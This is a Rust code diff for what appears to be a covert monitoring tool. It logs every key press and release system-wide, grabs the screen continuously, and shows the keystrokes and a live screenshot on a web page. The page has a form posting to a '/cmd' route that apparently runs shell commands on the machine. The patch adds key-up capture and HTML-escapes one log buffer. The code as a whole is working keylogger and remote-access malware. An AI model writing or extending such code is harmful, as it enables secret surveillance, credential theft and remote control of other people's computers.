@@ -16,6 +16,7 @@ use std::{
 };
 use tokio::{main, net::TcpListener, process::Command, spawn};
 use xcap::{Monitor, image::ImageFormat};
+use html_escape::encode_text;
 #[derive(Deserialize)]
 struct Frm {
     area: String,
@@ -25,21 +26,24 @@ async fn main() {
     let mut arg = args();
     arg.next();
     let lock = Arc::new(Mutex::new(String::new()));
-    let lock1 = Arc::clone(&lock);
-    let lock2 = Arc::clone(&lock);
+    let lock1 = lock.clone();
+    let lock2 = lock.clone();
+    let lock3 = lock.clone();
     let lck = Arc::new(Mutex::new(String::new()));
-    let lck1 = Arc::clone(&lck);
-    let lck2 = Arc::clone(&lck);
-    let _key_listener = DeviceEventsHandler::new(Duration::ZERO)
-        .unwrap()
-        .on_key_down(move |key| *lock2.lock().unwrap() += &(key.to_string() + " "));
+    let lck1 = lck.clone();
+    let lck2 = lck.clone();
+    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
+    let _down =
+        handler.on_key_down(move |key| *lock2.lock().unwrap() += &(key.to_string() + "&#x2193; "));
+    let _up =
+        handler.on_key_up(move |key| *lock3.lock().unwrap() += &(key.to_string() + "&#x2191; "));
     spawn(async {
         let lckin = lck2;
         loop {
-            let lckinin = lckin.clone();
+            let l = lckin.clone();
             listen(move |e| {
                 if let Some(name) = e.name {
-                    *lckinin.lock().unwrap() += &name;
+                    *l.lock().unwrap() += &name;
                 }
             })
             .unwrap();
@@ -61,8 +65,8 @@ async fn main() {
             head
         }, Html(
             String::from(
-                r#"<!DOCTYPE html><html><body><form action="/cmd" method="post"><textarea name="area"></textarea><input type="submit" value="提交" /></form><a href="/clear">清空</a><pre style="white-space: pre-wrap;">"#,
-            ) + lock1.lock().unwrap().as_str() + "<hr/>" + lck1.lock().unwrap().as_str()
+                r#"<!DOCTYPE html><html><body><form action="/cmd"method="post"><textarea name="area"></textarea><input type="submit"value="提交"/></form><a href="/clear">清空</a><pre style="white-space:pre-wrap;">"#,
+            ) + lock1.lock().unwrap().as_str() + "<hr>" + &*encode_text(lck1.lock().unwrap().as_str())
                 + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},160);</script></body></html>"#,
         )).into_response()
     })) .route("/cmd", post(async |Form(Frm { mut area })| {
